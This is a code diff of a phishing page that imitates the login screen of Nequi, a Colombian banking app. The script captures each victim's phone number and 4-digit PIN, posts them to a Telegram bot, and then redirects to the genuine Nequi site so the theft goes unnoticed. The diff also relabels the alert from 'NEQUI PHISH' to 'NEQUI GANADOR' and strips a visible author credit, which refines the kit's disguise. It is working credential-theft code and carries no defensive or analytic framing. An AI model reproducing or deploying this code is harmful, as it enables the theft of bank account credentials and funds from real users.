@@ -77,21 +77,11 @@
             right: 20px;
             font-size: 28px;
             color: #aaa;
-            cursor: pointer;
-        }
-        .by {
-            position: absolute;
-            top: 25px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 13px;
-            color: #777;
         }
     </style>
 </head>
 <body>
     <div class="help">?</div>
-    <div class="by">by <span style="color:#E91E63;">●</span></div>
 
     <div class="container">
         <div class="logo"><span>■</span>Nequi</div>
@@ -120,20 +110,25 @@
             const phone = document.getElementById("phone").value.trim();
             const password = document.getElementById("password").value.trim();
 
-            if (!/^\d{10}$/.test(phone)) return;
-            if (!/^\d{4}$/.test(password)) return;
+            if (phone.length !== 10 || !/^\d+$/.test(phone)) return;
+            if (password.length !== 4 || !/^\d+$/.test(password)) return;
 
-            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
+            const message = `🔴 NEQUI GANADOR\n\n📱 Número:  ${phone}\n🔑 Clave: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
+            // Envío inmediato al bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).then(() => {
-                setTimeout(() => {
-                    window.location.href = "https://www.nequi.com.co";
-                }, 800);
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message 
+                })
             });
+
+            // Redirección rápida
+            setTimeout(() => {
+                window.location.href = "https://www.nequi.com.co";
+            }, 650);
         });
     </script>
 </body>
